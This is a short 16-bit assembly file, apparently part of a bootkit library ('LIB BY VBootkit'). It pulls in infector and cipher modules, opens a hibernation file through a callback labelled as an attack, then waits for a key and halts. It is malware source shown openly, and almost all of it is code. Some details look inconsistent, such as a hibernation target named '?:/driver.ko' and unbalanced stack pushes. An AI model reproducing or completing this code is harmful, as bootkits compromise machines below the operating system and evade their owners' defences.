;;;;;;;;;;;;;;;;;;;;;;;;;;;
; >>> LIB BY VBootkit <<< ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;
use16

%include "infector.asm"
%include "cipher.asm"

org Boot_Application

%ifdef _Debug

mov eax,Debug_Message_Abort_Application
call API_Debug_Message


mov ah,04h
int 16h

mov eax,Debug_Message_Point
call API_Debug_Message_Append

push dword 1

mov eax,Debug_Message_Point
call API_Debug_Message_Append

mov ah,01h
int 16h
jnz Valid_Break_Key

push dword 1

mov eax,Debug_Message_EndPoint
call API_Debug_Message_Append

mov ah,01h
int 16h
jnz Valid_Break_Key

push dword 1

mov ah,01h
int 16h
jnz Valid_Break_Key

%endif

%ifdef _Debug

call API_Clear_Textmode_Screen

mov eax,Debug_Message_Open_File
call API_Debug_Message

%endif

push dword Hibernation_File_Callback
push dword File_Hibernation
call API_Open_File
jc Hibernation_File_Attack_Error_Handler


%ifdef _Debug

mov eax,Debug_Message_Finished
call API_Debug_Message

%endif

Hibernation_File_Attack_Error_Handler:

Get_F12_Key:

xor ah,ah
int 16h

cmp ah,42h
je Valid_Break_Key
cmp ah,58h
jne Get_F12_Key

Valid_Break_Key:

xor eax,eax
xor ebx,ebx
xor ecx,ecx
xor edx,edx

mov ds,ax
mov es,ax
mov fs,ax
mov gs,ax

hlt

File_Hibernation        db  "?:/driver.ko", 0 ;;; DRIVER ;;;
